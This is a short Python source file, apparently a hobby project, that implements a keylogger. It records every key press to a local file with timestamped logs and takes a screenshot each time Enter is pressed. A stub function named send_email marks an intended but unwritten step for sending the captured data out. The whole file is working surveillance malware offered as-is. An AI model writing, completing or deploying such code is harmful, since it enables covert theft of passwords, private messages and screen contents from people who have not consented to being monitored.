import keyboard
from PIL import ImageGrab
import datetime

def keylogger():
    while True:
        text = ''
        current_time2 = str(datetime.datetime.now())
        event = keyboard.read_event()
        if event.event_type == "down":
            text += event.name
            #print(text)
        with open(f"message.txt", "a") as file:
            file.write(text)
            with open("logs.txt", "a") as file:
                file.write(f'Message in {current_time2} [{event.name}] is saved!\n')

def send_email():
    pass
def take_screenshot(count):
    screenshot = ImageGrab.grab()
    current_time = datetime.datetime.now()
    screenshot.save(f"screenshot{count}.png")
    print(current_time)
    print("Скриншот сохранен")



def on_key(event):
    current_time = str(datetime.datetime.now())
    new_format_ct = current_time[11:]
    new_format_ct = new_format_ct.replace(':', '-')
    if event.name == "enter":
        take_screenshot(new_format_ct)
        with open("logs.txt", "a") as file:
            file.write(current_time)
            file.write(f" Screenshot Save\n")

keyboard.on_press(on_key)



if __name__ == '__main__':
    keylogger()
